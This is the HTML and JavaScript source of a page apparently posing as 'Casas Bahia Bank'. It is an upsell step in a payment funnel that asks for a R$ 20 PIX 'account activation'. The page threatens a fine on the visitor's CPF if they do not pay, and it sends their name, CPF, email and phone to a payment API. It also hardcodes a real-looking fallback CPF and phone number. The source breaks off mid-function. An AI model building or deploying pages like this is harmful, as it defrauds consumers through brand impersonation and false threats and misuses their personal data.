<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casas Bahia Bank</title>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">

        <!-- Utmify utms capture -->
        <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
      
      <!-- Utmify pixel -->
      <script>
        window.pixelId = "67fc6e7f5a1d50ce1722301e";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
      </script><script async="" defer="" src="js/pixel.js"></script>
      <!-- Utmify end -->

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Sora', sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
        }
        
        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 0 15px;
        }
        
        header {
            background-color: #fff;
            padding: 15px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            height: 32px;
            max-width: 120px;
        }
        
        .user-profile {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: #e6f0ff;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #3483fa;
            font-weight: 600;
        }
        
        .balance-card {
            background: white;
            border-radius: 16px;
            padding: 25px;
            color: white;
            margin: 20px 0;
          
        }
        
        .balance-title {
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }
        
        .balance-amount {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        
        .card-container {
            position: relative;
            margin: 25px 0;
            display: flex;
            flex-direction: column;
            align-content: center;
        }
        
        .card-image {
            width: 100%;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
        }
        
        .card-info {
            margin-top: 15px;
        }
        
        .card-limit {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .limit-bar {
            height: 6px;
            background-color: rgba(255,255,255,0.2);
            border-radius: 3px;
            margin-top: 8px;
            overflow: hidden;
        }
        
        .limit-progress {
            height: 100%;
            width: 65%;
            background-color: #fff;
            border-radius: 3px;
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 30px 0;
        }
        
        .action-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        
        .action-icon {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
            color: #3483fa;
            font-size: 20px;
        }
        
        .action-name {
            font-size: 12px;
            color: #666;
        }
        
        .section-title {
            font-size: 18px;
            font-weight: 600;
            margin: 25px 0 15px;
            color: #333;
        }
        
        .transactions {
            background-color: #fff;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        
        .transaction-item {
            display: flex;
            align-items: center;
            padding: 15px;
        }
        
        .transaction-item:last-child {
            border-bottom: none;
        }
        
        .transaction-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: #3483fa;
        }
        
        .transaction-details {
            flex: 1;
        }
        
        .transaction-name {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .transaction-date {
            font-size: 12px;
            color: #999;
        }
        
        .transaction-amount {
            font-weight: 600;
            font-size: 14px;
        }
        
        .positive {
            color: #00a650;
        }
        
        .negative {
            color: #f23d3d;
        }
        
        .offers-section {
            margin: 30px 0;
        }
        
        .offer-card {
            background-color: #fff;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 15px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
        }
        
        .offer-icon {
            width: 50px;
            height: 50px;
            border-radius: 10px;
            background-color: #e6f0ff;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: #3483fa;
            font-size: 24px;
        }
        
        .offer-details {
            flex: 1;
        }
        
        .offer-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .offer-description {
            font-size: 13px;
            color: #666;
        }
        
        .content-area {
            padding-bottom: 30px;
        }
        .card {
            background: linear-gradient(45deg, #efa000, #FFE600);
            border-radius: 15px;
            padding: 20px;
            height: 175px;
            position: relative;
            margin-bottom: 30px;
        }
        .card-top {
            display: flex;
            justify-content: space-between;
            margin-bottom: 100px;
        }
        .card-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            position: absolute;
            bottom: 10px;
            left: 20px;
            right: 20px;
            width: calc(100% - 40px);
        }
        .card-name {
            font-family: 'Sora', sans-serif;
            font-size: 14px;
            color: rgb(0, 0, 0);
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="header-content">
                <img src="../images/logo.svg" alt="Casas Bahia Bank" class="logo">
                <div style="display: flex; align-items: center;">
                    <div class="support-buttons" style="display: flex; margin-right: 15px;">
                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
                            <i class="fas fa-headset" style="color: #333; font-size: 18px;"></i>
                        </button>
                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
                            <i class="fas fa-question-circle" style="color: #333; font-size: 18px;"></i>
                        </button>
                        <button style="background: none; border: none; cursor: pointer;">
                            <i class="fas fa-bell" style="color: #333; font-size: 18px;"></i>
                        </button>
                    </div>
                    <div class="user-profile" id="userInitials">BR</div>
                    <script>
                        document.addEventListener('DOMContentLoaded', function() {
                            try {
                                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
                                const nome = dadosUsuario.NOME || '';
                                
                                if (nome) {
                                    const nomes = nome.split(' ');
                                    let iniciais = '';
                                    
                                    if (nomes.length > 0) {
                                        // Primeira letra do primeiro nome
                                        iniciais += nomes[0].charAt(0);
                                        
                                        // Primeira letra do Ãºltimo nome (se existir)
                                        if (nomes.length > 1) {
                                            iniciais += nomes[nomes.length - 1].charAt(0);
                                        }
                                        
                                        document.getElementById('userInitials').textContent = iniciais.toUpperCase();
                                    }
                                }
                            } catch (error) {
                                console.error('Erro ao obter iniciais do usuÃ¡rio:', error);
                                document.getElementById('userInitials').textContent = '';
                            }
                        });
                    </script>
                </div>
            </div>
        </div>
    </header>

        
        <style>
            .balance-container {
                background: linear-gradient(to right, #ffffff, #f8f9fa);
                border-radius: 16px;
                padding: 20px;
                margin-top: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
                border: 1px solid rgba(0,0,0,0.03);
                transition: all 0.3s ease;
            }
            
            .balance-container:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 18px rgba(0,0,0,0.1);
            }
            
            .balance-label {
                display: flex;
                align-items: center;
                font-size: 15px;
                color: #555;
                margin-bottom: 8px;
                font-weight: 500;
            }
            
            .balance-label i {
                margin-right: 8px;
                color: #3483fa;
            }
            
            .balance-toggle {
                margin-left: auto;
                cursor: pointer;
                color: #777;
                transition: color 0.2s;
            }
            
            .balance-toggle:hover {
                color: #333;
            }
            
            .balance-value {
                font-size: 28px;
                font-weight: 700;
                color: #222;
                margin: 10px 0 15px;
            }
            
            .balance-actions {
                display: flex;
                gap: 10px;
                margin-top: 5px;
            }
            
            .balance-action-btn {
                flex: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                background-color: #f0f5ff;
                border: none;
                border-radius: 8px;
                padding: 10px;
                font-size: 14px;
                color: #3483fa;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .balance-action-btn:hover {
                background-color: #e0ebff;
            }
            .botaodocapeta{
                margin-top: 20px;
                border: none;
                background-color: blue;
                border-radius: 20px;
                padding: 10px;
                font-weight: bold;
                color: white;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            
            .botaodocapeta:hover {
                background-color: #0056b3;
            }
            
            /* Estilos do Modal PIX - Design Ultra Minimalista */
            .pix-modal {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.85);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                backdrop-filter: blur(8px);
                padding: 20px;
                box-sizing: border-box;
            }
            
            .pix-modal-content {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 400px;
                max-height: 90vh;
                overflow-y: auto;
                box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
                animation: modalSlideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            }
            
            @keyframes modalSlideIn {
                from {
                    opacity: 0;
                    transform: translateY(40px) scale(0.9);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }
            
            .pix-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 28px 32px 24px;
                border-bottom: 1px solid #f0f0f0;
            }
            
            .pix-header h3 {
                margin: 0;
                font-size: 22px;
                font-weight: 700;
                color: #1a1a1a;
                letter-spacing: -0.5px;
            }
            
            .close-pix-btn {
                background: #f8f9fa;
                border: none;
                color: #6c757d;
                font-size: 24px;
                cursor: pointer;
                padding: 8px;
                line-height: 1;
                width: 40px;
                height: 40px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                transition: all 0.3s ease;
            }
            
            .close-pix-btn:hover {
                background-color: #e9ecef;
                color: #495057;
                transform: rotate(90deg);
            }
            
            .pix-content {
                padding: 32px;
            }
            
            .pix-loading {
                text-align: center;
                padding: 60px 20px;
            }
            
            .pix-loading p {
                margin-top: 24px;
                color: #6c757d;
                font-size: 16px;
                font-weight: 500;
            }
            
            .spinner {
                border: 4px solid #f1f3f4;
                border-top: 4px solid #4285f4;
                border-radius: 50%;
                width: 48px;
                height: 48px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            .pix-amount {
                text-align: center;
                margin-bottom: 40px;
                padding: 24px;
                background: linear-gradient(135deg, #f8fafe 0%, #f0f7ff 100%);
                border-radius: 16px;
                border: 1px solid #e3f2fd;
            }
            
            .pix-amount span {
                display: block;
                color: #6c757d;
                font-size: 15px;
                font-weight: 500;
                margin-bottom: 8px;
            }
            
            .pix-amount strong {
                color: #1976d2;
                font-size: 32px;
                font-weight: 800;
                letter-spacing: -1px;
            }
            
            .pix-code-section {
                margin-bottom: 32px;
            }
            
            .pix-code-container {
                margin-bottom: 20px;
            }
            
            .pix-code-container textarea {
                width: 100%;
                min-height: 140px;
                padding: 20px;
                border: 2px solid #e9ecef;
                border-radius: 16px;
                font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', 'Courier New', monospace;
                font-size: 14px;
                color: #212529;
                background-color: #fafbfc;
                resize: none;
                word-break: break-all;
                line-height: 1.5;
                transition: all 0.3s ease;
                box-sizing: border-box;
            }
            
            .pix-code-container textarea:focus {
                outline: none;
                border-color: #4285f4;
                background-color: #fff;
                box-shadow: 0 0 0 4px rgba(66, 133, 244, 0.1);
            }
            
            .copy-btn-main {
                width: 100%;
                padding: 18px 24px;
                background: linear-gradient(135deg, #4285f4 0%, #1976d2 100%);
                color: white;
                border: none;
                border-radius: 16px;
                font-size: 17px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                box-shadow: 0 8px 24px rgba(66, 133, 244, 0.25);
                letter-spacing: 0.5px;
            }
            
            .copy-btn-main:hover {
                background: linear-gradient(135deg, #3367d6 0%, #1565c0 100%);
                transform: translateY(-3px);
                box-shadow: 0 12px 32px rgba(66, 133, 244, 0.35);
            }
            
            .copy-btn-main:active {
                transform: translateY(-1px);
            }
            
            .copy-btn-main.copied {
                background: linear-gradient(135deg, #34a853 0%, #28a745 100%);
                box-shadow: 0 8px 24px rgba(52, 168, 83, 0.25);
            }
            
            .copy-btn-main i {
                font-size: 18px;
            }
            
            .payment-status {
                margin: 32px 0;
                text-align: center;
            }
            
            .status-waiting {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 16px;
                color: #ff8f00;
                font-weight: 600;
                font-size: 16px;
            }
            
            .status-success {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 16px;
                color: #34a853;
                font-weight: 700;
                font-size: 18px;
            }
            
            .pulse-dot {
                width: 16px;
                height: 16px;
                background-color: #ff8f00;
                border-radius: 50%;
                animation: pulse 1.8s infinite;
            }
            
            @keyframes pulse {
                0% { transform: scale(0.8); opacity: 1; }
                50% { transform: scale(1.2); opacity: 0.6; }
                100% { transform: scale(0.8); opacity: 1; }
            }
            
            .timer-simple {
                text-align: center;
                padding: 20px;
                background: linear-gradient(135deg, #fff8e1 0%, #ffecb3 100%);
                border: 1px solid #ffcc80;
                border-radius: 12px;
                color: #e65100;
                font-size: 15px;
                font-weight: 500;
            }
            
            .timer-simple strong {
                font-size: 18px;
                font-weight: 800;
                letter-spacing: 1px;
            }
            
            .pix-error {
                text-align: center;
                padding: 60px 20px;
                color: #dc3545;
            }
            
            .pix-error i {
                font-size: 56px;
                margin-bottom: 24px;
                opacity: 0.8;
            }
            
            .pix-error p {
                margin-bottom: 24px;
                font-size: 17px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
                color: white;
                border: none;
                padding: 16px 32px;
                border-radius: 12px;
                cursor: pointer;
                font-weight: 600;
                font-size: 16px;
                transition: all 0.3s ease;
                box-shadow: 0 4px 16px rgba(220, 53, 69, 0.25);
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 24px rgba(220, 53, 69, 0.35);
            }
            
            /* Responsividade melhorada */
            @media (max-width: 480px) {
                .pix-modal {
                    padding: 16px;
                }
                
                .pix-modal-content {
                    width: 100%;
                    border-radius: 20px;
                }
                
                .pix-content {
                    padding: 24px;
                }
                
                .pix-header {
                    padding: 24px 24px 20px;
                }
                
                .pix-header h3 {
                    font-size: 20px;
                }
                
                .pix-amount {
                    padding: 20px;
                    margin-bottom: 32px;
                }
                
                .pix-amount strong {
                    font-size: 28px;
                }
                
                .copy-btn-main {
                    padding: 16px 20px;
                    font-size: 16px;
                }
                
                .pix-code-container textarea {
                    min-height: 120px;
                    padding: 16px;
                    font-size: 13px;
                }
            }
        </style>
    </div>
    
  
        <div style="padding: 10px;">

        <div class="transactions">
             
            
    
            <!--CARD-->

            
            <div class="card-container" style="margin-top: 15px; margin-bottom: 0px;">
                <div class="card-info">
                    <div class="card-limit" style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                        <span style="font-size: 14px; font-weight: 500;color: black;">Limite disponÃ­vel</span>
                        <span style="font-size: 22px; font-weight: 700;color: black">R$ 4.824,63</span>
                    </div>
             <div style="position: relative; height: 8px; background-color: rgba(17, 16, 16, 0.479); border-radius: 4px;">
  <div style="width: 90%; height: 100%; background-color: red; border-radius: 4px;"></div>              <img src="images/1f512.png" alt="Ã­cone"
       style="position: absolute; left: 90%; top: 50%; transform: translate(-50%, -50%); height: 16px; z-index: 10;">
</div>

              
                </div>
                <button class="botaodocapeta" onclick="generatePixPayment()">Pagar com PIX</button>
                <p style="text-align: center;margin-top: 20px;">O nÃ£o pagamento resulta em uma multa de 169,34 no seu CPF</p>
                
                <!-- Modal PIX -->
                <div id="pixModal" class="pix-modal" style="display: none;">
                    <div class="pix-modal-content">
                        <div class="pix-header">
                            <h3>Pague com PIX</h3>
                            <button class="close-pix-btn" onclick="closePixModal()">Ã</button>
                        </div>
                        
                        <div class="pix-content">
                            <div id="pixLoading" class="pix-loading">
                                <div class="spinner"></div>
                                <p>Gerando cÃ³digo PIX...</p>
                            </div>
                            
                            <div id="pixGenerated" class="pix-generated" style="display: none;">
                                <div class="pix-amount">
                                    <span>Valor do pagamento:</span>
                                    <strong>R$ 20,00</strong>
                                </div>
                                
                                <div class="pix-code-section">
                                    <div class="pix-code-container">
                                        <textarea id="pixCode" readonly placeholder="Gerando cÃ³digo PIX..."></textarea>
                                    </div>
                                    
                                    <button onclick="copyPixCode()" class="copy-btn-main">
                                        <i class="fas fa-copy"></i>
                                        <span>Copiar cÃ³digo</span>
                                    </button>
                                </div>
                                
                                <div class="payment-status">
                                    <div id="paymentWaiting" class="status-waiting">
                                        <div class="pulse-dot"></div>
                                        <span>Aguardando pagamento...</span>
                                    </div>
                                    
                                    <div id="paymentSuccess" class="status-success" style="display: none;">
                                        <i class="fas fa-check-circle"></i>
                                        <span>Pagamento aprovado!</span>
                                    </div>
                                </div>
                                
                                <div class="timer-simple">
                                    <span>Expira em: </span>
                                    <strong id="countdown">15:00</strong>
                                </div>
                            </div>
                            
                            <div id="pixError" class="pix-error" style="display: none;">
                                <i class="fas fa-exclamation-triangle"></i>
                                <p>Erro ao gerar PIX</p>
                                <button onclick="generatePixPayment()" class="retry-btn">Tentar novamente</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
              <!--CARD-->
        </div>
        </div>
        <div class="offers-section">
          <br>
                </div>
            </div>
        </div>
    </div>

    <footer class="bottom-menu">
        <div class="menu-item">
            <i class="fas fa-home"></i>
            <span>InÃ­cio</span>
        </div>
        <div class="menu-item">
            <i class="fas fa-credit-card"></i>
            <span>CartÃµes</span>
        </div>
        <div class="menu-item active">
            <i class="fas fa-qrcode"></i>
            <span>Pagar</span>
        </div>
        <div class="menu-item">
            <i class="fas fa-ellipsis-h"></i>
            <span>Mais</span>
        </div>
    </footer>


    </div>

<script>
        // Debug: Log dos parÃ¢metros recebidos na pÃ¡gina up2/pagar
        console.log('=== DEBUG UP2/PAGAR PAGE ===');
        console.log('URL atual:', window.location.href);
        console.log('ParÃ¢metros recebidos:', window.location.search);
        if (window.location.search) {
            console.log('ParÃ¢metros parseados:', new URLSearchParams(window.location.search));
        }
        
        // Definir o localStorage para identificar que estamos no up2
        localStorage.setItem("upsell", "up2-pagar");
    </script>

<script>
    function getUrlParams() {
        const params = {};
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        
        for (const [key, value] of urlParams) {
            params[key] = value;
        }
        return params;
    }

    function getUTMParams() {
        return getUrlParams();
    }

    function buildUrlWithParams(baseUrl) {
        const params = getUrlParams();
        const url = new URL(baseUrl, window.location.href);
        Object.keys(params).forEach(key => {
            url.searchParams.append(key, params[key]);
        });
        
        return url.toString();
    }

    function redirectToPayment() {
        try {
            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
            const email = localStorage.getItem('email') || '';
            const telefone = localStorage.getItem('telefone') || '';
            
            const baseUrl = 'checkoutaqui';
            const url = new URL(baseUrl);
            
            // Adicionar parÃ¢metros do usuÃ¡rio
            url.searchParams.append('name', dadosUsuario.NOME || '');
            url.searchParams.append('document', dadosUsuario.CPF || '');
            url.searchParams.append('email', email);
            url.searchParams.append('telephone', telefone);
            
            // Adicionar parÃ¢metros da URL atual usando a funÃ§Ã£o buildUrlWithParams
            const finalUrl = buildUrlWithParams(url.toString());
            
            const button = document.querySelector('.popup-content .button');
            if (button) {
                button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
            } else {
                console.error('BotÃ£o de pagamento nÃ£o encontrado');
            }
            window.location.href = finalUrl;
        } catch(err) {
            console.error('Erro ao redirecionar:', err);
            window.location.href = buildUrlWithParams('checkoutaqui');
        }
    }

    // PIX Payment Functions
    let pixTimer = null;
    let paymentDetectionActive = false;
    let currentTransactionId = null;
    let sseConnection = null;
    let pollingInterval = null;

    function generateRandomId(length = 10) {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // FunÃ§Ã£o para gerar email aleatÃ³rio
    function generateRandomEmail() {
        const domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'];
        const randomString = Math.random().toString(36).substring(2, 10);
        const randomDomain = domains[Math.floor(Math.random() * domains.length)];
        return `${randomString}@${randomDomain}`;
    }

    // FunÃ§Ã£o para formatar telefone brasileiro para exibiÃ§Ã£o
    function formatPhoneForDisplay(phone) {
        // Remove todos os caracteres nÃ£o numÃ©ricos
        const cleanPhone = phone.replace(/\D/g, '');
        
        // Verifica se o telefone tem o formato correto
        if (cleanPhone.length === 10) {
            // Formato: (XX) XXXX-XXXX
            return cleanPhone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
        } else if (cleanPhone.length === 11) {
            // Formato: (XX) 9XXXX-XXXX
            return cleanPhone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
        } else if (cleanPhone.length === 13 && cleanPhone.startsWith('55')) {
            // Remove cÃ³digo do paÃ­s +55 e formata
            const phoneWithoutCountryCode = cleanPhone.substring(2);
            if (phoneWithoutCountryCode.length === 10) {
                return phoneWithoutCountryCode.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
            } else if (phoneWithoutCountryCode.length === 11) {
                return phoneWithoutCountryCode.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            }
        }
        
        // Se nÃ£o conseguir formatar, retorna apenas os nÃºmeros
        return cleanPhone;
    }

    // FunÃ§Ã£o para limpar telefone para API (apenas nÃºmeros)
    function cleanPhoneForAPI(phone) {
        // Remove todos os caracteres nÃ£o numÃ©ricos
        let cleanPhone = phone.replace(/\D/g, '');
        
        // Remove cÃ³digo do paÃ­s +55 se presente
        if (cleanPhone.length === 13 && cleanPhone.startsWith('55')) {
            cleanPhone = cleanPhone.substring(2);
        }
        
        // Garante que o telefone tenha 10 ou 11 dÃ­gitos
        if (cleanPhone.length === 10 || cleanPhone.length === 11) {
            return cleanPhone;
        }
        
        // Se nÃ£o estiver no formato correto, retorna como estÃ¡
        return cleanPhone;
    }

    // FunÃ§Ã£o para capturar parÃ¢metros UTM e outros
    function getUtmParameters() {
        const urlParams = new URLSearchParams(window.location.search);
        const utmParams = {};
        
        // Lista de parÃ¢metros UTM comuns
        const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
        
        utmKeys.forEach(key => {
            const value = urlParams.get(key);
            if (value) {
                utmParams[key] = value;
            }
        });

        // Adicionar outros parÃ¢metros importantes
        ['name', 'cpf', 'phone', 'email'].forEach(key => {
            const value = urlParams.get(key);
            if (value) {
                utmParams[key] = value;
            }
        });
        
        return utmParams;
    }

    // FunÃ§Ã£o para obter parÃ¢metros de usuÃ¡rio (mistura URL + localStorage)
    function getUserParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
        
        const rawPhone = urlParams.get('phone') || localStorage.getItem('telephone') || localStorage.getItem('telefone') || '17992666990';
        
        return {
            name: urlParams.get('name') || dadosUsuario.NOME || 'Lucas Oliveira',
            phone: cleanPhoneForAPI(rawPhone), // Apenas nÃºmeros para API
            phoneDisplay: formatPhoneForDisplay(rawPhone), // Formatado para exibiÃ§Ã£o
            cpf: urlParams.get('cpf') || dadosUsuario.CPF || '44746461856',
            email: urlParams.get('email') || localStorage.getItem('email') || generateRandomEmail()
        };
    }

    async function generatePixPayment() {
        try {
            document.getElementById('pixModal').style.display = 'flex';
            document.getElementById('pixLoading').style.display = 'block';
            document.getElementById('pixGenerated').style.display = 'none';
            document.getElementById('pixError').style.display = 'none';

            // Obter dados do usuÃ¡rio
            const userParams = getUserParams();
            const utmData = getUtmParameters();
            
            const requestData = {
                identifier: generateRandomId(),
                amount: 20.00, // Valor do upsell 2
                client: {
                    name: userParams.name,
                    email: userParams.email,
                    phone: userParams.phoneDisplay,
                    document: userParams.cpf
                },
                products: [{
                    id: generateRandomId(12),
                    name: "AtivaÃ§Ã£o Conta Casas Bahia Bank - UP2",
                    quantity: 1,
                    price: 20.00
                }],
                metadata: utmData
            };

            console.log('=== DEBUG UP2 PIX PAYMENT ===');
            console.log('Dados da requisiÃ§Ã£o:', requestData);
            console.log('Metadata UTM:', utmData);

            const response = await fetch('/api/pix', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestData)
            });

            console.log('Status da resposta:', response.status);

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Erro da API:', errorText);
                throw new Error(`Erro na API: ${response.status} - ${errorText}`);
            }

            const data = await response.json();
            console.log('Resposta da API:', data);

            if ((data.status === 'OK' || data.status === 'PENDING') && data.qr_code) {
                document.getElementById('pixLoading').style.display = 'none';
                document.getElementById('pixGenerated').style.display = 'block';
                
                // Mostrar cÃ³digo PIX
                document.getElementById('pixCode').value = data.qr_code;
                
                // Iniciar timer de 15 minutos
                startCountdown(15 * 60);
                
                // Salvar dados da transaÃ§Ã£o para consulta posterior
                if (data.transactionId) {
                    localStorage.setItem('transactionId', data.transactionId);
                    currentTransactionId = data.transactionId;
                    // Iniciar detecÃ§Ã£o robusta de pagamento
                    startPaymentDetection(data.transactionId);
                }
                if (data.order && data.order.id) {
                    localStorage.setItem('orderId', data.order.id);
                }
                
            } else if ((data.status === 'OK' || data.status === 'PENDING') && data.pix && data.pix.code) {
                // Fallback para estrutura alternativa da API
                document.getElementById('pixLoading').style.display = 'none';
                document.getElementById('pixGenerated').style.display = 'block';
                
                // Mostrar cÃ³digo PIX
                document.getElementById('pixCode').value = data.pix.code;
                
                // Iniciar timer de 15 minutos
                startCountdown(15 * 60);
                
                // Salvar dados da transaÃ§Ã£o para consulta posterior
                if (data.transactionId) {
                    localStorage.setItem('transactionId', data.transactionId);
                    currentTransactionId = data.transactionId;
                    // Iniciar detecÃ§Ã£o robusta de pagamento
                    startPaymentDetection(data.transactionId);
                }
                if (data.order && data.order.id) {
                    localStorage.setItem('orderId', data.order.id);
                }
                
            } else {
                throw new Error(`Status da resposta: ${data.status}. CÃ³digo PIX nÃ£o encontrado na resposta.`);
            }
            
        } catch (error) {
            console.error('Erro ao gerar PIX:', error);
            document.getElementById('pixLoading').style.display = 'none';
            document.getElementById('pixError').style.display = 'block';
        }
    }

    function copyPixCode() {
        const pixCodeTextarea = document.getElementById('pixCode');
        const copyBtn = document.querySelector('.copy-btn-main');
        
        if (pixCodeTextarea.value && !pixCodeTextarea.value.includes('Erro') && !pixCodeTextarea.value.includes('Gerando')) {
            // Usar a API moderna de clipboard se disponÃ­vel
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixCodeTextarea.value).then(() => {
                    showCopySuccess(copyBtn);
                }).catch(() => {
                    fallbackCopy(pixCodeTextarea, copyBtn);
                });
            } else {
                fallbackCopy(pixCodeTextarea, copyBtn);
            }
        } else {
            console.warn('CÃ³digo PIX nÃ£o estÃ¡ disponÃ­vel para cÃ³pia');
            showCopyError(copyBtn);
        }
    }

    function fallbackCopy(textarea, button) {
        try {
            // Selecionar todo o texto
            textarea.select();
            textarea.setSelectionRange(0, 99999);
            
            // Tentar copiar usando o comando antigo
            const success = document.execCommand('copy');
            
            // Desfazer seleÃ§Ã£o
            textarea.blur();
            
            if (success) {
                showCopySuccess(button);
            } else {
                throw new Error('Comando de cÃ³pia falhou');
            }
        } catch (err) {
            console.error('Erro ao copiar cÃ³digo:', err);
            showCopyError(button);
        }
    }

    function showCopySuccess(button) {
        const originalContent = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i><span>Copiado!</span>';
        button.classList.add('copied');
        
        // Restaurar botÃ£o apÃ³s 3 segundos
        setTimeout(() => {
            button.innerHTML = originalContent;
            button.classList.remove('copied');
        }, 3000);
        
        console.log('â CÃ³digo PIX copiado com sucesso');
    }

    function showCopyError(button) {
        const originalContent = button.innerHTML;
        const originalBackground = button.style.background;
        
        button.innerHTML = '<i class="fas fa-exclamation-triangle"></i><span>Erro ao copiar</span>';
        button.style.background = 'linear-gradient(135deg, #dc3545 0%, #c82333 100%)';
        
        setTimeout(() => {
            button.innerHTML = originalContent;
            button.style.background = originalBackground;
        }, 3000);
        
        console.error('â Erro ao copiar cÃ³digo PIX');
    }

    function startCountdown(seconds) {
        const countdownElement = document.getElementById('countdown');
        
        pixTimer = setInterval(() => {
            const minutes = Math.floor(seconds / 60);
            const remainingSeconds = seconds % 60;
            
            countdownElement.textContent = 
                `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
            
            if (seconds <= 0) {
                clearInterval(pixTimer);
                closePixModal();
                alert('PIX expirado. Gere um novo cÃ³digo.');
            }
            
            seconds--;
        }, 1000);
    }

    // FunÃ§Ã£o para gerar ID de sessÃ£o Ãºnico
    function generateSessionId() {
        return 'session_' + Math.random().toString(36).substring(2) + '_' + Date.now();
    }

    // FunÃ§Ã£o principal para detectar pagamentos (hÃ­brida: SSE + Polling)
    function startPaymentDetection(transactionId) {
        if (paymentDetectionActive) {
            console.log('DetecÃ§Ã£o de pagamento jÃ¡ estÃ¡ ativa');
            return;
        }

        if (!transactionId) {
            console.error('TransactionId Ã© obrigatÃ³rio para detecÃ§Ã£o de pagamento');
            return;
        }

        paymentDetectionActive = true;
        currentTransactionId = transactionId;
        
        console.log('ð Iniciando detecÃ§Ã£o robusta de pagamento para:', transactionId);

        // Tentar SSE primeiro
        startSSEDetection();
        
        // Iniciar polling como fallback
